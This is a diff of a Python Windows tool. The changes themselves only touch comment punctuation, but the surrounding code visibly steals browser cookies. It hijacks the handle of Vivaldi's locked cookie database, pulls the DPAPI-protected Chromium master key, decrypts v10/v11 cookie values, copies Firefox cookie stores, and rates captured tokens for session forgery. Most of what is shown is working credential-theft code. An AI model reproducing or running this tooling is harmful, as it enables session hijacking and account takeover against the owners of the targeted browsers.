@@ -41,7 +41,7 @@ if sys.platform == "win32":
     kernel32 = ctypes.WinDLL("kernel32.dll")
     crypt32 = ctypes.WinDLL("crypt32.dll")
 
-# Set argtypes for functions that need 64-bit handle support
+# Set argtypes for functions that need 64-bit handle support.
 kernel32.OpenProcess.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]
 kernel32.OpenProcess.restype = ctypes.wintypes.HANDLE
 kernel32.DuplicateHandle.argtypes = [
@@ -79,8 +79,8 @@ FILE_TYPE_DISK = 0x0001
 class SYSTEM_HANDLE_INFORMATION_EX(ctypes.Structure):
     _fields_ = [
         ("Object", ctypes.c_void_p),
-        ("UniqueProcessId", ctypes.POINTER(ctypes.c_ulong)),  # actually ULONG_PTR
-        ("HandleValue", ctypes.POINTER(ctypes.c_ulong)),      # actually ULONG_PTR
+        ("UniqueProcessId", ctypes.POINTER(ctypes.c_ulong)),  # Actually ULONG_PTR
+        ("HandleValue", ctypes.POINTER(ctypes.c_ulong)),      # Actually ULONG_PTR
         ("GrantedAccess", ctypes.c_ulong),
         ("CreatorBackTraceIndex", ctypes.c_ushort),
         ("ObjectTypeIndex", ctypes.c_ushort),
@@ -88,7 +88,7 @@ class SYSTEM_HANDLE_INFORMATION_EX(ctypes.Structure):
         ("Reserved", ctypes.c_ulong),
     ]
 
-# We'll parse the raw buffer manually since the struct layout is tricky on x64
+# We'll parse the raw buffer manually since the struct layout is tricky on x64.
 
 def find_pids(exe_name):
     """Find PIDs by exe name using CreateToolhelp32Snapshot."""
@@ -135,7 +135,7 @@ def hijack_cookie_db(browser_exe, dst_path, table_name="cookies"):
     pid_set = set(pids)
 
     # Query all system handles (0x40 = SystemExtendedHandleInformation)
-    # System has ~12MB of handle data, need to retry with growing buffer
+    # System has ~12MB of handle data, need to retry with growing buffer.
     buf_size = 0x400000  # 4MB initial
     buf = None
     status = STATUS_INFO_LENGTH_MISMATCH
@@ -156,13 +156,13 @@ def hijack_cookie_db(browser_exe, dst_path, table_name="cookies"):
         print(f"  [!] NtQuerySystemInformation failed: 0x{status & 0xFFFFFFFF:08X} (attempt {attempt+1})")
         return False
 
-    # Parse: 16-byte header (NumberOfHandles:8 + Reserved:8), then 40-byte entries
+    # Parse: 16-byte header (NumberOfHandles:8 + Reserved:8), then 40-byte entries.
     raw = bytes(buf[:ret_len.value])
     num_handles = struct.unpack_from("<Q", raw, 0)[0]
     print(f"  [*] Total system handles: {num_handles}")
 
     entry_size = 40  # x64: Object(8) + PID(8) + Handle(8) + Access(4) + BackTrace(2) + Type(2) + Attr(4) + Reserved(4)
-    offset = 16  # skip header
+    offset = 16  # Skip header
 
     scanned = 0
     browser_handles = 0
@@ -179,7 +179,7 @@ def hijack_cookie_db(browser_exe, dst_path, table_name="cookies"):
             continue
         browser_handles += 1
 
-        # Open the browser process for handle duplication
+        # Open the browser process for handle duplication.
         h_proc = kernel32.OpenProcess(PROCESS_DUP_HANDLE, False, pid)
         if not h_proc:
             continue
@@ -196,14 +196,14 @@ def hijack_cookie_db(browser_exe, dst_path, table_name="cookies"):
 
         kernel32.CloseHandle(h_proc)
 
-        # Check if it's a disk file
+        # Check if it's a disk file.
         ftype = kernel32.GetFileType(dup_handle)
         if ftype != FILE_TYPE_DISK:
             kernel32.CloseHandle(dup_handle)
             continue
         disk_found += 1
 
-        # Read first 16 bytes to check for SQLite magic
+        # Read first 16 bytes to check for SQLite magic.
         try:
             read_buf = (ctypes.c_char * 16)()
             bytes_read = ctypes.wintypes.DWORD(0)
@@ -324,7 +324,7 @@ def get_chromium_key(local_state_path):
     encrypted_key_b64 = data["os_crypt"]["encrypted_key"]
     encrypted_key = base64.b64decode(encrypted_key_b64)
 
-    # Strip "DPAPI" prefix (5 bytes)
+    # Strip "DPAPI" prefix (5 bytes).
     if encrypted_key[:5] == b"DPAPI":
         encrypted_key = encrypted_key[5:]
 
@@ -345,14 +345,14 @@ def decrypt_chromium_value(encrypted_value, key, host_key=None):
     # v10/v11 prefix
     if encrypted_value[:3] in (b"v10", b"v11"):
         nonce = encrypted_value[3:15]    # 12 bytes
-        tag = encrypted_value[-16:]      # last 16 bytes
+        tag = encrypted_value[-16:]      # Last 16 bytes
         ciphertext = encrypted_value[15:-16]
         try:
             plaintext = aes_gcm_decrypt(key, nonce, ciphertext, tag)
         except Exception as e:
             return f"[DECRYPT_FAILED: {e}]"
 
-        # Check for 32-byte SHA256(host_key) domain hash prefix (Chrome >=118)
+        # Check for 32-byte SHA256(host_key) domain hash prefix (Chrome >=118).
         if host_key and len(plaintext) >= 32:
             expected_hash = hashlib.sha256(host_key.encode("utf-8")).digest()
             if plaintext[:32] == expected_hash:
@@ -360,7 +360,7 @@ def decrypt_chromium_value(encrypted_value, key, host_key=None):
 
         return plaintext.decode("utf-8", errors="replace")
 
-    # v20 prefix (Chrome >=127 app-bound)
+    # v20 prefix (Chrome >=127 app-bound).
     if encrypted_value[:3] == b"v20":
         return "[V20_ENCRYPTED: needs app-bound key extraction]"
 
@@ -396,7 +396,7 @@ def extract_vivaldi_cookies():
         print("  [!] Failed to extract key")
         return []
 
-    # Extract DB via handle hijacking
+    # Extract DB via handle hijacking.
     tmp_db = os.path.join(os.environ["TEMP"], "vivaldi_cookies_hijack.db")
     print(f"\n  [*] Hijacking cookie DB handle...")
     if not hijack_cookie_db("vivaldi.exe", tmp_db, "cookies"):
@@ -422,7 +422,7 @@ def extract_vivaldi_cookies():
     for row in cur.fetchall():
         host, name, path, enc_val, expires_utc, secure, httponly, samesite, has_expires = row
 
-        # Convert expires_utc (Chrome epoch: microseconds since 1601-01-01)
+        # Convert expires_utc (Chrome epoch: microseconds since 1601-01-01).
         if expires_utc == 0:
             unix_exp = 0
         else:
@@ -491,7 +491,7 @@ def extract_firefox_cookies():
         if not os.path.exists(db_path):
             continue
         print(f"  [*] Reading: {db_path}")
-        # Copy to temp to avoid lock
+        # Copy to temp to avoid lock.
         tmp = os.path.join(os.environ["TEMP"], "ff_cookies_tmp.db")
         try:
             import shutil
@@ -578,7 +578,7 @@ def classify_and_analyze(value):
         info["forgery"] = assess_jwt_forgery(info["jwt"])
         return info
 
-    # Express signed cookie: s:payload.signature
+    # Express signed cookie: s:payload.signature.
     if value.startswith("s:"):
         info["type"] = "express_signed"
         info["encoding"] = "signed_cookie"
@@ -587,7 +587,7 @@ def classify_and_analyze(value):
         info["forgery"] = "FEASIBLE: if Express session secret is weak (hashcat/john), forge arbitrary session data"
         return info
 
-    # Two-part token (id.signature or token.hmac)
+    # Two-part token (id.signature or token.hmac).
     if len(parts) == 2 and len(parts[0]) > 10 and len(parts[1]) > 4:
         info["type"] = "two_part"
         info["encoding"] = "signed_token"
@@ -652,7 +652,7 @@ def classify_and_analyze(value):
         try:
             decoded = re.sub(r'%([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1), 16)), value)
             info["notes"].append(f"url_decoded={decoded[:60]}")
-            # Check if decoded is JSON
+            # Check if decoded is JSON.
             if decoded.startswith("{"):
                 info["type"] = "url_encoded_json"
                 info["encoding"] = "url_encoded"
